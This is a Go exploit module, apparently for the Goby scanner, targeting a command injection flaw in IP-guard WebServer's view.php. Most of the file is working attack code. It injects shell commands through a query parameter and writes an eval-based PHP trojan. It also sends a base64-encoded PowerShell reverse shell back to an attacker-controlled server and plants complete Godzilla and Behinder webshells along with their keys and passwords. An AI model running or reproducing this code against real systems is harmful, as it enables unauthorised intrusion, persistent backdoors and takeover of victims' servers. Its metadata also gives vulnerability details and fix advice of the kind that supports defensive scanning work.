package exploits

import (
	"encoding/base64"
	"encoding/hex"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net"
	"net/url"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "IP-guard WebServer view.php remote command execution vulnerability",
    "Description": "<p>IP-guard is a terminal security management software developed by Yixin Technology Co., Ltd. It is designed to help enterprises protect terminal equipment security, data security, manage network usage and simplify IT system management.</p><p>There is a vulnerability in IP-Guard version less than 4.81.0307.0. An attacker can use this vulnerability to execute arbitrary code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Product": "IP-Guard",
    "Homepage": "https://www.ip-guard.net/",
    "DisclosureDate": "2023-11-08",
    "PostTime": "2023-11-09",
    "Author": "Gryffinbit@gmail.com",
    "FofaQuery": "body=\"LOGIN_SUCCESS_RESTART_SERVICES\" || body=\"backup_db_store_path\" || body=\"Sign/create_vcode\" || title=\"IP-guard\"",
    "GobyQuery": "body=\"LOGIN_SUCCESS_RESTART_SERVICES\" || body=\"backup_db_store_path\" || body=\"Sign/create_vcode\" || title=\"IP-guard\"",
    "Level": "3",
    "Impact": "<p>An attacker can use this vulnerability to execute arbitrary code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vulnerability has been officially fixed. Please upgrade IP-guard WebServer to version 4.81.0307.0 or contact the official for a fix. <a href=\"https://www.ip-guard.net/\">https://www.ip-guard.net/</a></p><p>Temporary fix:</p><p>1. Use protective equipment to protect relevant assets;</p><p>2. Avoid exposing IP-guard WebServer to the Internet;</p><p>3. After confirming that it will not affect the business, you can directly delete the vulnerable files (be sure to back up before deleting)</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse,webshell",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "dir",
            "show": "attackType=cmd"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "hellooo.php",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<?php echo \"hello\"; ?>",
            "show": "attackType=webshell,webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "IP-guard WebServer view.php 远程命令执行漏洞",
            "Product": "IP-guard",
            "Description": "<p>IP-guard 是由溢信科技股份有限公司开发的一款终端安全管理软件，旨在帮助企业保护终端设备安全、数据安全、管理网络使用和简化IT系统管理。</p><p>IP-Guard 版本小于4.81.0307.0 存在漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>官方已修复漏洞，请升级 IP-guard WebServer 至4.81.0307.0版本或联系官方获取修复方案。<a href=\"https://www.ip-guard.net/\">https://www.ip-guard.net/</a></p><p>临时修复方案：</p><p>1.使用防护类设备对相关资产进行防护；</p><p>2.避免将IP-guard WebServer暴露在互联网；</p><p>3.在确认不影响业务的情况下，可以直接删除存在漏洞的文件（删除前注意备份）</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "IP-guard WebServer view.php remote command execution vulnerability",
            "Product": "IP-Guard",
            "Description": "<p>IP-guard is a terminal security management software developed by Yixin Technology Co., Ltd. It is designed to help enterprises protect terminal equipment security, data security, manage network usage and simplify IT system management.</p><p>There is a vulnerability in IP-Guard version less than 4.81.0307.0. An attacker can use this vulnerability to execute arbitrary code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The vulnerability has been officially fixed. Please upgrade IP-guard WebServer to version 4.81.0307.0 or contact the official for a fix. <a href=\"https://www.ip-guard.net/\">https://www.ip-guard.net/</a></p><p>Temporary fix:</p><p>1. Use protective equipment to protect relevant assets;</p><p>2. Avoid exposing IP-guard WebServer to the Internet;</p><p>3. After confirming that it will not affect the business, you can directly delete the vulnerable files (be sure to back up before deleting)</p>",
            "Impact": "<p>An attacker can use this vulnerability to execute arbitrary code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10869"
}`

	base64EncodeG73gbY37RF := func(input string) string {
		inputBytes := []byte(input)
		encodedString := base64.StdEncoding.EncodeToString(inputBytes)
		return encodedString
	}
	escapeG73gbY37RF := func(input string) string {
		replacements := map[string]string{
			"<": "^<",
			">": "^>",
			";": "^;",
			"^": "^^",
		}
		pattern := "(" + regexp.QuoteMeta("<") + "|" + regexp.QuoteMeta(">") + "|" + regexp.QuoteMeta(";") + "|" + regexp.QuoteMeta("^") + ")"
		regex := regexp.MustCompile(pattern)
		result := regex.ReplaceAllStringFunc(input, func(match string) string {
			return replacements[match]
		})
		return result
	}
	sendPayloadG73gbY37RF := func(hostInfo *httpclient.FixUrl, payload, filename string) (*httpclient.HttpResponse, error) {
		payloadConfig := httpclient.NewGetRequestConfig("/ipg/static/appr/lib/flexpaper/php/view.php?doc=1.docx\"+%26+echo+" + url.QueryEscape(payload) + ">+" + filename + "+%23&page=exp&format=pdf&callback=callback&isSplit=true")
		payloadConfig.VerifyTls = false
		payloadConfig.FollowRedirect = false
		payloadConfig.Header.Store("Upgrade-Insecure-Requests", "1")
		return httpclient.DoHttpRequest(hostInfo, payloadConfig)
	}
	checkFileG73gbY37RF := func(hostInfo *httpclient.FixUrl, file string) (*httpclient.HttpResponse, error) {
		checkConfig := httpclient.NewGetRequestConfig("/ipg/static/appr/lib/flexpaper/php/" + file)
		checkConfig.VerifyTls = false
		checkConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, checkConfig)
	}
	executePhpCodeG73gbY37RF := func(hostInfo *httpclient.FixUrl, phpcode string) (*httpclient.HttpResponse, error) {
		execConfig := httpclient.NewGetRequestConfig("/ipg/static/appr/lib/flexpaper/php/7sbG3cu.php?poo=" + url.QueryEscape(base64EncodeG73gbY37RF(phpcode)))
		execConfig.VerifyTls = false
		execConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, execConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			//echo test > test.txt
			randomStr := goutils.RandomHexString(10)
			randomFile := goutils.RandomHexString(4) + ".txt"
			resp, _ := sendPayloadG73gbY37RF(hostInfo, randomStr, randomFile)
			if resp != nil && resp.StatusCode == 200 {
				check, _ := checkFileG73gbY37RF(hostInfo, randomFile)
				return check != nil && check.StatusCode == 200 && strings.Contains(check.RawBody, randomStr)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			webshell := goutils.B2S(stepLogs.Params["webshell"])
			filename := goutils.RandomHexString(6) + ".php"
			waitSessionCh := make(chan string)
			var phpCode string
			tool := ""
			password := ""
			if attackType == "cmd" {
				cmd := goutils.B2S(stepLogs.Params["cmd"])
				phpCode = `echo system("` + cmd + `");`
			} else if attackType == "reverse" {
				rp, err := godclient.WaitSession("reverse_windows", waitSessionCh)
				if err != nil {
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				addr := godclient.GetGodServerHost()
				ip := net.ParseIP(addr)
				if ip != nil {
					addr = ip.String()
				} else {
					ips, err := net.LookupIP(addr)
					if err != nil {
						expResult.Success = false
						expResult.Output = err.Error()
					}
					addr = ips[0].String()
				}
				phpCode = `system(base64_decode("` + base64EncodeG73gbY37RF("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('"+addr+"',"+rp+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"") + `"));`
			} else if attackType == "webshell" {
				content := goutils.B2S(stepLogs.Params["content"])
				if webshell == "godzilla" {
					tool = "Godzilla v4.1"
					password = "pass 加密器：PHP_XOR_BASE64"
					content = `<?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i<strlen($D);$i++) { $c = $K[$i+1&15]; $D[$i] = $D[$i]^$c; } return $D; } $pass="pass"; $payloadName="payload"; $key="3c6e0b8a9c15224a"; if (isset($_POST[$pass])){ $data=encode(base64_decode($_POST[$pass]),$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,"getBasicsInfo")===false){ $payload=encode($payload,$key); } eval($payload); echo substr(md5($pass.$key),0,16); echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); }else{ if (strpos($data,"getBasicsInfo")!==false){ $_SESSION[$payloadName]=encode($data,$key);}}}?>`
				} else if webshell == "behinder" {
					tool = "Behinder v3.0"
					password = "rebeyond"
					content = `<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION["k"]=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded("openssl")){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,"AES128",$key);}$arr=explode("|",$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p."");}}@call_user_func(new C(),$params);?>`
				} else if webshell == "custom" {
					filename = goutils.B2S(stepLogs.Params["filename"])
					content = goutils.B2S(stepLogs.Params["content"])
				} else {
					expResult.Success = false
					expResult.Output = `未知的的利用方式`
					return expResult
				}
				phpCode = `file_put_contents("` + filename + `",'` + strings.Replace(content, "'", "\\'", -1) + `');`
			}
			resp, err := executePhpCodeG73gbY37RF(expResult.HostInfo, phpCode)
			// 这里只做报错处理，成功之后，进入下面不同的 exp 阶段，不同的 exp 有不同的输出
			if err != nil {
				expResult.Output = err.Error()
				return expResult
			} else if resp != nil && resp.StatusCode == 404 {
				tinyTrojan, err := sendPayloadG73gbY37RF(expResult.HostInfo, escapeG73gbY37RF("<?php eval(base64_decode($_REQUEST['poo'])); ?>"), "7sbG3cu.php")
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				} else if tinyTrojan != nil && tinyTrojan.StatusCode != 200 {
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				if attackType == "reverse" {
					go executePhpCodeG73gbY37RF(expResult.HostInfo, phpCode)
				} else {
					respRepeat, err := executePhpCodeG73gbY37RF(expResult.HostInfo, phpCode)
					if err != nil {
						expResult.Output = err.Error()
						return expResult
					} else if respRepeat != nil && respRepeat.StatusCode != 200 {
						expResult.Output = "漏洞利用失败"
						return expResult
					}
				}
			}
			if attackType == "cmd" {
				if strings.Contains(resp.Utf8Html, "WebServer\\www\\ipg/tempFile/publish") {
					str, _ := hex.DecodeString("2322206275727374206F757470")
					expResult.Success = true
					expResult.Output = resp.Utf8Html[:strings.LastIndex(resp.Utf8Html, string(str))]
					return expResult
				}
			} else if attackType == "reverse" {
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else if attackType == "webshell" {
				expResult.Success = true
				expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/ipg/static/appr/lib/flexpaper/php/" + filename + "\n"
				if webshell != "custom" {
					expResult.Output += "Password: " + password + "\n"
					expResult.Output += "WebShell tool: " + tool + "\n"
					expResult.Output += "Webshell type: php"
				}
			}
			return expResult
		},
	))
}